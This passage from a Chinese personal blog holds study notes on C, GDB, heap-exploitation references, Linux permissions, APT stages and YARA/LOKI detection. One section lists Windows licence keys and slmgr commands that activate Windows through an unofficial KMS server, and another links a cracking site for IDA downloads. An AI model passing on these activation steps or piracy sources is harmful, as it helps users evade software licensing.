<p>若回收的chunk大于mmap分配阈值且小于default_mmap_threshold_max，调整分配阈值为当前回收的chunk的大小，并且将mmap收缩阈值设置为mmap分配阈值的两倍。—–动态调整机制</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/03/17/Daily-learning-and-document-collection/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/03/17/Daily-learning-and-document-collection/" class="post-title-link" itemprop="url">Daily learning and document collection</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-03-17 08:49:46" itemprop="dateCreated datePublished" datetime="2021-03-17T08:49:46+08:00">2021-03-17</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-11-06 16:02:05" itemprop="dateModified" datetime="2021-11-06T16:02:05+08:00">2021-11-06</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="C-C-sizeof函数解析——解决sizeof求结构体大小的问题"><a href="#C-C-sizeof函数解析——解决sizeof求结构体大小的问题" class="headerlink" title="C/C++ sizeof函数解析——解决sizeof求结构体大小的问题"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0201zcr/p/4789332.html">C/C++ sizeof函数解析——解决sizeof求结构体大小的问题</a></h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0201zcr/p/4789332.html">C/C++ sizeof函数解析——解决sizeof求结构体大小的问题 - WhyWin - 博客园 (cnblogs.com)</a></p>
<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct stu1  </span><br><span class="line">&#123;  </span><br><span class="line">     int i;  </span><br><span class="line">     char c;  </span><br><span class="line">     int j;  </span><br><span class="line">&#125;；  </span><br></pre></td></tr></table></figure>
<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
<p>   用sizeof求该结构体的大小，发现值为12。int占4个字节，char占1个字节，结果应该是9个字节才对啊，为什么呢？</p>
<p>   先介绍一个相关的概念——偏移量。偏移量<strong>指的是结构体变量中成员的地址和结构体变量地址的差</strong>。结构体大小<strong>等于最后一个成员的偏移量加上最后一个成员的大小</strong>。显然，结构体变量中第一个成员的地址就是结构体变量的首地址。因此，第一个成员i的偏移量为0。第二个成员c的偏移量是第一个成员的偏移量加上第一个成员的大小（0+4）,其值为4；第三个成员j的偏移量是第二个成员的偏移量加上第二个成员的大小（4+1）,其值为5。</p>
<p>   然而，在实际中，<strong>存储变量时地址要求对齐</strong>，编译器在编译程序时会遵循两条<strong>原则</strong>：</p>
<p>   <strong>（1）结构体变量中成员的偏移量必须是成员大小的整数倍（0被认为是任何数的整数倍）</strong> </p>
<p>   <strong>（2）结构体大小必须是所有成员大小的整数倍，也即所有成员大小的公倍数。</strong></p>
<h2 id="期刊"><a href="#期刊" class="headerlink" title="期刊"></a>期刊</h2><blockquote>
<p>序号 期刊名称 主办单位 网址 </p>
<p>1 软件学报 中国科学院软件研究所 中国计算机学会 <a target="_blank" rel="noopener" href="http://www.jos.org.cn/">http://www.jos.org.cn</a> </p>
<p>2 计算机学报 中国计算机学会 中国科学院计算技术研究所 <a target="_blank" rel="noopener" href="http://cjc.ict.ac.cn/">http://cjc.ict.ac.cn</a></p>
<p>3 中国科学：信息科学 中国科学院 国家自然科学基金委员会 <a target="_blank" rel="noopener" href="http://infocn.scichina.com/">http://infocn.scichina.com</a></p>
<p> 4 计算机研究与发展 中国科学院计算技术研究所 中国计算机学会 <a target="_blank" rel="noopener" href="http://crad.ict.ac.cn/">http://crad.ict.ac.cn</a> </p>
<p>5 计算机辅助设计与图形学学报 中国计算机学会 中国科学院计算技术研究所 <a target="_blank" rel="noopener" href="http://www.jcad.cn/">http://www.jcad.cn</a> </p>
<p>6 电子学报 中国电子学会 <a target="_blank" rel="noopener" href="http://www.ejournal.org.cn/">http://www.ejournal.org.cn</a> </p>
<p>7 自动化学报 中国自动化学会 中国科学院自动化研究所 <a target="_blank" rel="noopener" href="http://www.aas.net.cn/">http://www.aas.net.cn</a></p>
</blockquote>
<h2 id="网址-搜索引擎"><a href="#网址-搜索引擎" class="headerlink" title="网址/搜索引擎"></a>网址/搜索引擎</h2><p><a target="_blank" rel="noopener" href="https://admin-root.blog.csdn.net/article/details/109069749">https://admin-root.blog.csdn.net/article/details/109069749</a></p>
<h2 id="用vmware安装window-xp系统"><a href="#用vmware安装window-xp系统" class="headerlink" title="用vmware安装window xp系统"></a>用vmware安装window xp系统</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/linxinfa/article/details/112768896">https://blog.csdn.net/linxinfa/article/details/112768896</a></p>
<p>itellyou:<a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn)</a></p>
<h2 id="GDB调试"><a href="#GDB调试" class="headerlink" title="GDB调试"></a>GDB调试</h2><p>i r：查看寄存器值</p>
<p>vmmap查看进程内存分布</p>
<p>pmap  PID 查看进程内存分布</p>
<p>在 gdb 调试中，使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#x2F;32gx &amp;main_arena</span><br></pre></td></tr></table></figure>
<p>可以看到 main_arena 的内存分配情况。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yeholmes/article/details/106454289">GDB内存调试初探二_yeholmes的专栏-CSDN博客</a>   </p>
<h2 id="IDA-版本下载"><a href="#IDA-版本下载" class="headerlink" title="IDA 版本下载"></a>IDA 版本下载</h2><p><a target="_blank" rel="noopener" href="https://down.52pojie.cn/?query=ida">爱盘 - 最新的在线破解工具包 (52pojie.cn)</a></p>
<h2 id="ACM-ICPC培训资料汇编-2-基本数据结构与算法分册"><a href="#ACM-ICPC培训资料汇编-2-基本数据结构与算法分册" class="headerlink" title="ACM-ICPC培训资料汇编(2)基本数据结构与算法分册"></a>ACM-ICPC培训资料汇编(2)基本数据结构与算法分册</h2><p><a target="_blank" rel="noopener" href="http://www.doc88.com/p-3059640614423.html">ACM-ICPC培训资料汇编(2)基本数据结构与算法分册 - 道客巴巴 (doc88.com)</a></p>
<h2 id="堆利用方法"><a href="#堆利用方法" class="headerlink" title="堆利用方法"></a>堆利用方法</h2><p><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a></p>
<h2 id="汇编和机器码的转换"><a href="#汇编和机器码的转换" class="headerlink" title="汇编和机器码的转换"></a>汇编和机器码的转换</h2><p>radare</p>
<p>rasm2 -L    #查看architectures<br>rasm2 -a x86 -b 32 ‘mov eax, 33’    #转机器码<br>echo ‘push eax;nop;nop’ | rasm2 -f -   </p>
<p>rasm2 -a x86 -d 55  #转汇编 push ebp</p>
<h2 id="linux源码分析"><a href="#linux源码分析" class="headerlink" title="linux源码分析"></a>linux源码分析</h2><p><a target="_blank" rel="noopener" href="https://www.jeanleo.com/">https://www.jeanleo.com/</a></p>
<h2 id="linux-权限详解"><a href="#linux-权限详解" class="headerlink" title="linux 权限详解"></a>linux 权限详解</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013197629/article/details/73608613">https://blog.csdn.net/u013197629/article/details/73608613</a></p>
<h3 id="权限简介"><a href="#权限简介" class="headerlink" title="权限简介"></a>权限简介</h3><p>Linux系统上对文件的权限有着严格的控制，用于如果相对某个文件执行某种操作，必须具有对应的权限方可执行成功。<br>Linux下文件的权限类型一般包括读，写，执行。对应字母为 r、w、x。<br>Linux下权限的粒度有 拥有者 、群组 、其它组 三种。每个文件都可以针对三个粒度，设置不同的rwx(读写执行)权限。通常情况下，一个文件只能归属于一个用户和组， 如果其它的用户想有这个文件的权限，则可以将该用户加入具备权限的群组，一个用户可以同时归属于多个组。<br>Linux上通常使用chmod命令对文件的权限进行设置和更改。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">范例：</span><br><span class="line"></span><br><span class="line">设置所有人可以读写及执行</span><br><span class="line">chmod 777 file  (等价于  chmod u&#x3D;rwx,g&#x3D;rwx,o&#x3D;rwx file 或  chmod a&#x3D;rwx file)</span><br><span class="line">设置拥有者可读写，其他人不可读写执行</span><br><span class="line">chmod 600 file (等价于  chmod u&#x3D;rw,g&#x3D;---,o&#x3D;--- file 或 chmod u&#x3D;rw,go-rwx file )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">十位权限表示</span><br><span class="line">常见的权限表示形式有：</span><br><span class="line"></span><br><span class="line">-rw------- (600)    只有拥有者有读写权限。</span><br><span class="line">-rw-r--r-- (644)    只有拥有者有读写权限；而属组用户和其他用户只有读权限。</span><br><span class="line">-rwx------ (700)    只有拥有者有读、写、执行权限。</span><br><span class="line">-rwxr-xr-x (755)    拥有者有读、写、执行权限；而属组用户和其他用户只有读、执行权限。</span><br><span class="line">-rwx--x--x (711)    拥有者有读、写、执行权限；而属组用户和其他用户只有执行权限。</span><br><span class="line">-rw-rw-rw- (666)    所有用户都有文件读、写权限。</span><br><span class="line">-rwxrwxrwx (777)    所有用户都有读、写、执行权限。</span><br></pre></td></tr></table></figure>
<h2 id="IDA反汇编失败–函数参数的问题"><a href="#IDA反汇编失败–函数参数的问题" class="headerlink" title="IDA反汇编失败–函数参数的问题"></a>IDA反汇编失败–函数参数的问题</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30389003/article/details/97561175">https://blog.csdn.net/weixin_30389003/article/details/97561175</a></p>
<h2 id="读反汇编出的c语言代码"><a href="#读反汇编出的c语言代码" class="headerlink" title="读反汇编出的c语言代码"></a>读反汇编出的c语言代码</h2><p><img src="https://i.imgur.com/2102GnB.png"></p>
<p>这是一个数组，首地址(&amp;v17),a2是数组的长度。</p>
<p><img src="https://i.imgur.com/ZduiP7i.png"></p>
<p>这也是一个char数组的循环赋值</p>
<h3 id="void-shellcode-和-void-void-shellcode"><a href="#void-shellcode-和-void-void-shellcode" class="headerlink" title="( * (void ( * ) () )shellcode) ()和((void (*)(void))shellcode)()"></a>( * (void ( * ) () )shellcode) ()和((void (*)(void))shellcode)()</h3><p>调用shellcode这个地址的内容  -调用-》&amp;shellcode</p>
<h3 id="基础c语言知识"><a href="#基础c语言知识" class="headerlink" title="基础c语言知识"></a>基础c语言知识</h3><p><strong>%.2lf——&gt;</strong></p>
<blockquote>
<p>在printf()里表示按下面格式输出一个long double型数：整数部分输出全部输出小数部分输出2位，没有小数的输出两个0，不足两位的后面补0，大于两位的截短到两位。</p>
</blockquote>
<p><strong>%.2f ——&gt;</strong></p>
<blockquote>
<p>在printf()里按下面格式输出一个浮点型数，整数部分输出全部输出小数部分输出2位，没有小数的输出两个0，不足两位的后面补0，大于两位的截短到两位。</p>
</blockquote>
<p><strong>ifndef/define/endif 的含义:</strong></p>
<blockquote>
<p>如果未定义 / 那么定义 / 完成假设 </p>
<p>一般是用来防止头文件被重复包含,提高编译效率的。</p>
</blockquote>
<p>*<em>long int atol(const char</em>s);**</p>
<blockquote>
<p>输入一个字符数组（注意，不是string类型的字符串）的头元素的地址，然后我们就可以转换成数值。</p>
</blockquote>
<p><strong>size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)</strong> 从给定流 <strong>stream</strong> 读取数据到 <strong>ptr</strong> 所指向的数组中。</p>
<h2 id="a和-amp-a的区别含义"><a href="#a和-amp-a的区别含义" class="headerlink" title="*a和&amp;a的区别含义"></a>*a和&amp;a的区别含义</h2><p><strong>变量a 本质上代表一个存储单元</strong>。CPU通过该存储单元的地址访问该存储单元中的数据。所以<strong>a本来代表两个值：存储单元的地址和储单元中的数据。</strong>于是就有了二异性。为了消除这种二义性，C语言规定a表示存储单元中的数据，&amp;a表示存储单元的地址。</p>
<h2 id="汇编跳转指令解析"><a href="#汇编跳转指令解析" class="headerlink" title="汇编跳转指令解析"></a>汇编跳转指令解析</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wq57885/article/details/80700032">https://blog.csdn.net/wq57885/article/details/80700032</a></p>
<p>JMP、JECXZ、JA、JB、JG、JL、JE、JZ、JS、JC、JO、JP</p>
<h3 id="IDA宏定义"><a href="#IDA宏定义" class="headerlink" title="IDA宏定义"></a>IDA宏定义</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bluestar628/article/details/78428868">https://blog.csdn.net/bluestar628/article/details/78428868</a></p>
<h2 id="HASH？"><a href="#HASH？" class="headerlink" title="HASH？"></a>HASH？</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ztx114/article/details/88789118">https://blog.csdn.net/ztx114/article/details/88789118</a></p>
<p><strong>哈希函数、算法</strong></p>
<p><strong>哈希算法将任意长度的二进制值映射为较短的固定长度的二进制值，这个小的二进制值称为哈希值。</strong>哈希值是一段数据唯一且极其紧凑的数值表示形式。如果散列一段明文而且哪怕只更改该段落的一个字母，随后的哈希都将产生不同的值。要找到散列为同一个值的两个不同的输入，在计算上是不可能的，所以数据的哈希值可以检验数据的完整性。一般用于快速查找和加密算法 —《数据结构与算法分析》</p>
<h2 id="APT攻击及辅助工具"><a href="#APT攻击及辅助工具" class="headerlink" title="APT攻击及辅助工具"></a>APT攻击及辅助工具</h2><h3 id="APT攻击"><a href="#APT攻击" class="headerlink" title="APT攻击"></a>APT攻击</h3><p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/28881041">什么是 APT 攻击？ - 知乎 (zhihu.com)</a></p>
<p>APT攻击是一个集合了多种常见攻击方式的综合攻击。综合多种攻击途径来尝试突破网络防御，通常是通过Web或电子邮件传递，利用应用程序或操作系统的漏洞，利用传统的网络保护机制无法提供统一的防御。除了使用多种途径，高级定向攻击还采用多个阶段穿透一个网络，然后提取有价值的信息，这使得它的攻击更不容易被发现。</p>
<p><strong>第一阶段：扫描探测</strong>—踩点</p>
<p><strong>第二阶段：工具投送</strong>—诱骗工作人员打开恶意附件或者恶意URL</p>
<p><strong>第三阶段：漏洞利用</strong>—投送恶意代码、执行自身</p>
<p><strong>第四阶段：木马植入</strong>—各种恶意软件的可执行文件批量下载</p>
<p><strong>第五阶段：远程控制</strong>—建立共知点</p>
<p><strong>第六阶段：横向渗透</strong>—以员工电脑为跳板对系统内部横向渗透</p>
<p><strong>第七阶段：目标行动</strong>—将敏感数据传出内部网络</p>
<h3 id="LOKI"><a href="#LOKI" class="headerlink" title="LOKI"></a>LOKI</h3><p>主要是把它当成一个日志来用。通过ioc（loki内置的危险特征库）（黑盒里面含有各种比如说恶意代码的哈希值等一些特征）去比对，他提到的yara也是基于文本或二进制模式创建恶意软件家族描述信息，通过我们提供扫描对象，比如移动介质、网络共享、文件夹等来进行比对分析，比如比对恶意样本哈希值，大量匹配可疑文件签名，600多个网页后门YARA规则（YARA可以基于文本或二进制模式创建恶意软件家族描述信息，当然也可以是其他匹配信息。YARA的每一条描述或规则都由一系列字符串和一个布尔型表达式构成，并阐述其逻辑。）最后给出我们警告，然后有我们自己去比对处理。</p>
<p><strong>IOC（Indicator of Compromise）</strong></p>
<p>　　MANDIANT在长期的数字取证实践中定义的可以反映主机或网络行为的技术指示器，IOC以XML文档类型描述捕获多种威胁的事件响应信息，包括病毒文件的属性、注册表改变的特征、虚拟内存等，是一种入侵后可以取证的指标，可以识别一台主机或整个网络。而OpenIOC是一个威胁情报共享的标准，通过遵循该标准，可以建立IOC的逻辑分组，在机器中以一种可读的格式进行通信，从而实现威胁情报的交流共享。比如事件响应团队可以使用OpenIOC的规范编写多个IOCs来描述一个威胁的技术共性。</p>
<p>YARA是一款旨在帮助恶意软件研究人员识别和分类恶意软件样本的开源工具，使用YARA可以基于文本或二进制模式创建恶意软件家族描述信息，当然也可以是其他匹配信息。</p>
<h2 id="最新malloc-c"><a href="#最新malloc-c" class="headerlink" title="最新malloc.c"></a>最新malloc.c</h2><p><a target="_blank" rel="noopener" href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=7c8bf8413c54c367031ca274c9bca497a45897f8;hb=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f">https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=7c8bf8413c54c367031ca274c9bca497a45897f8;hb=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f</a></p>
<h2 id="更换pwn题libc"><a href="#更换pwn题libc" class="headerlink" title="更换pwn题libc"></a>更换pwn题libc</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yongbaoii/article/details/111938821">PWN 更换目标程序libc_yongbaoii的博客-CSDN博客</a></p>
<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p>Python的lambda函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sq</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x*x</span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span>(sq,[y <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)])</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>(<span class="keyword">lambda</span> x: x*x,[y <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)])</span><br></pre></td></tr></table></figure>


<h2 id="win10"><a href="#win10" class="headerlink" title="win10"></a>win10</h2><p>激活：<a target="_blank" rel="noopener" href="https://moedog.org/1117.html">https://moedog.org/1117.html</a></p>
<h5 id="单击查看-KMS-密钥"><a href="#单击查看-KMS-密钥" class="headerlink" title="单击查看 KMS 密钥"></a>单击查看 KMS 密钥</h5><table>
<thead>
<tr>
<th><strong>版本</strong></th>
<th><strong>KMS 密钥</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Windows 10 Pro</td>
<td>W269N-WFGWX-YVC9B-4J6C9-T83GX</td>
</tr>
<tr>
<td>Windows 10 Pro N</td>
<td>MH37W-N47XK-V7XM9-C7227-GCQG9</td>
</tr>
<tr>
<td>Windows 10 Pro Workstations</td>
<td>NRG8B-VKK3Q-CXVCJ-9G2XF-6Q84J</td>
</tr>
<tr>
<td>Windows 10 Pro Workstations N</td>
<td>9FNHH-K3HBT-3W4TD-6383H-6XYWF</td>
</tr>
<tr>
<td>Windows 10 Pro Education</td>
<td>6TP4R-GNPTD-KYYHQ-7B7DP-J447Y</td>
</tr>
<tr>
<td>Windows 10 Pro Education N</td>
<td>YVWGF-BXNMC-HTQYQ-CPQ99-66QFC</td>
</tr>
<tr>
<td>Windows 10 Education</td>
<td>NW6C2-QMPVW-D7KKK-3GKT6-VCFB2</td>
</tr>
<tr>
<td>Windows 10 Education N</td>
<td>2WH4N-8QGBV-H22JP-CT43Q-MDWWJ</td>
</tr>
<tr>
<td>Windows 10 Enterprise</td>
<td>NPPR9-FWDCX-D2C8J-H872K-2YT43</td>
</tr>
<tr>
<td>Windows 10 Enterprise N</td>
<td>DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4</td>
</tr>
<tr>
<td>Windows 10 Enterprise G</td>
<td>YYVX9-NTFWV-6MDM3-9PT4T-4M68B</td>
</tr>
<tr>
<td>Windows 10 Enterprise G N</td>
<td>44RPN-FTY23-9VTTB-MP9BX-T84FV</td>
</tr>
<tr>
<td>Windows 10 Enterprise LTSC 2019</td>
<td>M7XTQ-FN8P6-TTKYV-9D4CC-J462D</td>
</tr>
<tr>
<td>Windows 10 Enterprise N LTSC 2019</td>
<td>92NFX-8DJQP-P6BBQ-THF9C-7CG2H</td>
</tr>
<tr>
<td>Windows 10 Enterprise LTSB 2016</td>
<td>DCPHK-NFMTC-H88MJ-PFHPY-QJ4BJ</td>
</tr>
<tr>
<td>Windows 10 Enterprise N LTSB 2016</td>
<td>QFFDN-GRT3P-VKWWX-X7T3R-8B639</td>
</tr>
<tr>
<td>Windows 10 Enterprise LTSB 2015</td>
<td>WNMTR-4C88C-JK8YV-HQ7T2-76DF9</td>
</tr>
<tr>
<td>Windows 10 Enterprise N LTSB 2015</td>
<td>2F77B-TNFGY-69QQF-B8YKP-D69TJ</td>
</tr>
<tr>
<td>Windows 8.1 Pro</td>
<td>GCRJD-8NW9H-F2CDX-CCM8D-9D6T9</td>
</tr>
<tr>
<td>Windows 8.1 Pro N</td>
<td>HMCNV-VVBFX-7HMBH-CTY9B-B4FXY</td>
</tr>
<tr>
<td>Windows 8.1 Enterprise</td>
<td>MHF9N-XY6XB-WVXMC-BTDCT-MKKG7</td>
</tr>
<tr>
<td>Windows 8.1 Enterprise N</td>
<td>TT4HM-HN7YT-62K67-RGRQJ-JFFXW</td>
</tr>
<tr>
<td>Windows 8 Pro</td>
<td>NG4HW-VH26C-733KW-K6F98-J8CK4</td>
</tr>
<tr>
<td>Windows 8 Pro N</td>
<td>XCVCF-2NXM9-723PB-MHCB7-2RYQQ</td>
</tr>
<tr>
<td>Windows 8 Enterprise</td>
<td>32JNW-9KQ84-P47T8-D8GGY-CWCK7</td>
</tr>
<tr>
<td>Windows 8 Enterprise N</td>
<td>JMNMF-RHW7P-DMY6X-RF3DR-X2BQT</td>
</tr>
<tr>
<td>Windows 7 Professional</td>
<td>FJ82H-XT6CR-J8D7P-XQJJ2-GPDD4</td>
</tr>
<tr>
<td>Windows 7 Professional N</td>
<td>MRPKT-YTG23-K7D7T-X2JMM-QY7MG</td>
</tr>
<tr>
<td>Windows 7 Professional E</td>
<td>W82YF-2Q76Y-63HXB-FGJG9-GF7QX</td>
</tr>
<tr>
<td>Windows 7 Enterprise</td>
<td>33PXH-7Y6KF-2VJC9-XBBR8-HVTHH</td>
</tr>
<tr>
<td>Windows 7 Enterprise N</td>
<td>YDRBP-3D83W-TY26F-D46B2-XCKRJ</td>
</tr>
<tr>
<td>Windows 7 Enterprise E</td>
<td>C29WB-22CC8-VJ326-GHFJW-H9DH4</td>
</tr>
<tr>
<td>Windows Server 2019 Datacenter</td>
<td>WMDGN-G9PQG-XVVXX-R3X43-63DFG</td>
</tr>
<tr>
<td>Windows Server 2019 Standard</td>
<td>N69G4-B89J2-4G8F4-WWYCC-J464C</td>
</tr>
<tr>
<td>Windows Server 2019 Essentials</td>
<td>WVDHN-86M7X-466P6-VHXV7-YY726</td>
</tr>
<tr>
<td>Windows Server 2016 Datacenter</td>
<td>CB7KF-BWN84-R7R2Y-793K2-8XDDG</td>
</tr>
<tr>
<td>Windows Server 2016 Standard</td>
<td>WC2BQ-8NRM3-FDDYY-2BFGV-KHKQY</td>
</tr>
<tr>
<td>Windows Server 2016 Essentials</td>
<td>JCKRF-N37P4-C2D82-9YXRT-4M63B</td>
</tr>
<tr>
<td>Windows Server 2012 R2 Datacenter</td>
<td>W3GGN-FT8W3-Y4M27-J84CP-Q3VJ9</td>
</tr>
<tr>
<td>Windows Server 2012 R2 Standard</td>
<td>D2N9P-3P6X9-2R39C-7RTCD-MDVJX</td>
</tr>
<tr>
<td>Windows Server 2012 R2 Essentials</td>
<td>KNC87-3J2TX-XB4WP-VCPJV-M4FWM</td>
</tr>
<tr>
<td>Windows Server 2012</td>
<td>BN3D2-R7TKB-3YPBD-8DRP2-27GG4</td>
</tr>
<tr>
<td>Windows Server 2012 N</td>
<td>8N2M2-HWPGY-7PGT9-HGDD8-GVGGY</td>
</tr>
<tr>
<td>Windows Server 2012 Single Language</td>
<td>2WN2H-YGCQR-KFX6K-CD6TF-84YXQ</td>
</tr>
<tr>
<td>Windows Server 2012 Country Specific</td>
<td>4K36P-JN4VD-GDC6V-KDT89-DYFKP</td>
</tr>
<tr>
<td>Windows Server 2012 Standard</td>
<td>XC9B7-NBPP2-83J2H-RHMBY-92BT4</td>
</tr>
<tr>
<td>Windows Server 2012 MultiPoint Standard</td>
<td>HM7DN-YVMH3-46JC3-XYTG7-CYQJJ</td>
</tr>
<tr>
<td>Windows Server 2012 MultiPoint Premium</td>
<td>XNH6W-2V9GX-RGJ4K-Y8X6F-QGJ2G</td>
</tr>
<tr>
<td>Windows Server 2012 Datacenter</td>
<td>48HP8-DN98B-MYWDG-T2DCC-8W83P</td>
</tr>
<tr>
<td>Windows Server 2008 R2 Web</td>
<td>6TPJF-RBVHG-WBW2R-86QPH-6RTM4</td>
</tr>
<tr>
<td>Windows Server 2008 R2 HPC edition</td>
<td>TT8MH-CG224-D3D7Q-498W2-9QCTX</td>
</tr>
<tr>
<td>Windows Server 2008 R2 Standard</td>
<td>YC6KT-GKW9T-YTKYR-T4X34-R7VHC</td>
</tr>
<tr>
<td>Windows Server 2008 R2 Enterprise</td>
<td>489J6-VHDMP-X63PK-3K798-CPX3Y</td>
</tr>
<tr>
<td>Windows Server 2008 R2 Datacenter</td>
<td>74YFP-3QFB3-KQT8W-PMXWJ-7M648</td>
</tr>
<tr>
<td>Windows Server 2008 R2 for Itanium-based Systems</td>
<td>GT63C-RJFQ3-4GMB6-BRFB9-CB83V</td>
</tr>
<tr>
<td>Windows Web Server 2008</td>
<td>WYR28-R7TFJ-3X2YQ-YCY4H-M249D</td>
</tr>
<tr>
<td>Windows Server 2008 Standard</td>
<td>TM24T-X9RMF-VWXK6-X8JC9-BFGM2</td>
</tr>
<tr>
<td>Windows Server 2008 Standard without Hyper-V</td>
<td>W7VD6-7JFBR-RX26B-YKQ3Y-6FFFJ</td>
</tr>
<tr>
<td>Windows Server 2008 Enterprise</td>
<td>YQGMW-MPWTJ-34KDK-48M3W-X4Q6V</td>
</tr>
<tr>
<td>Windows Server 2008 Enterprise without Hyper-V</td>
<td>39BXF-X8Q23-P2WWT-38T2F-G3FPG</td>
</tr>
<tr>
<td>Windows Server 2008 HPC</td>
<td>RCTX3-KWVHP-BR6TB-RB6DM-6X7HP</td>
</tr>
<tr>
<td>Windows Server 2008 Datacenter</td>
<td>7M67G-PC374-GR742-YH8V4-TCBY3</td>
</tr>
<tr>
<td>Windows Server 2008 Datacenter without Hyper-V</td>
<td>22XQ2-VRXRG-P8D42-K34TD-G3QQC</td>
</tr>
<tr>
<td>Windows Server 2008 for Itanium-Based Systems</td>
<td>4DWFP-JF3DJ-B7DTH-78FJB-PDRHK</td>
</tr>
<tr>
<td>Windows Server Datacenter, version 1809/1903</td>
<td>6NMRW-2C8FM-D24W7-TQWMY-CWH2D</td>
</tr>
<tr>
<td>Windows Server Standard, version 1809/1903</td>
<td>N2KJX-J94YW-TQVFB-DG9YT-724CC</td>
</tr>
<tr>
<td>Windows Server Datacenter, version 1803</td>
<td>2HXDN-KRXHB-GPYC7-YCKFJ-7FVDG</td>
</tr>
<tr>
<td>Windows Server Standard, version 1803</td>
<td>PTXN8-JFHJM-4WC78-MPCBR-9W4KR</td>
</tr>
<tr>
<td>Windows Server Datacenter, version 1709</td>
<td>6Y6KB-N82V8-D8CQV-23MJW-BWTG6</td>
</tr>
<tr>
<td>Windows Server Standard, version 1709</td>
<td>DPCNP-XQFKJ-BJF7R-FRC8D-GF6G4</td>
</tr>
</tbody></table>
<blockquote>
<p>slmgr /ipk CB7KF-BWN84-R7R2Y-793K2-8XDDG //序列号请根据您系统来,请看后面<br> slmgr /skms kms.03k.org<br> slmgr /ato<br> slmgr /xpr //查看激活后的到期时间**</p>
</blockquote>
<h2 id="给了libc查看题目的glibc版本"><a href="#给了libc查看题目的glibc版本" class="headerlink" title="给了libc查看题目的glibc版本"></a>给了libc查看题目的glibc版本</h2><blockquote>
<p>strings libc.so.6 |grep ‘GLIBC’</p>
</blockquote>
<p><img src="https://i.imgur.com/xNYnXWQ.png"></p>
<p>看到该题目使用的glibc是2.23版本</p>
<h2 id="glibc-下载"><a href="#glibc-下载" class="headerlink" title="glibc 下载"></a>glibc 下载</h2><p><a target="_blank" rel="noopener" href="https://gnu.askapache.com/libc/">https://gnu.askapache.com/libc/</a></p>
<h2 id="CALL指令的原理"><a href="#CALL指令的原理" class="headerlink" title="CALL指令的原理"></a>CALL指令的原理</h2><p><img src="https://i.imgur.com/Sr2w7VH.png"></p>
<p>这里相差0x10</p>
<p><img src="https://i.imgur.com/o2ZxNcb.png"></p>
<p>call都是call相对地址，当前指令和想要执行指令的偏移。</p>
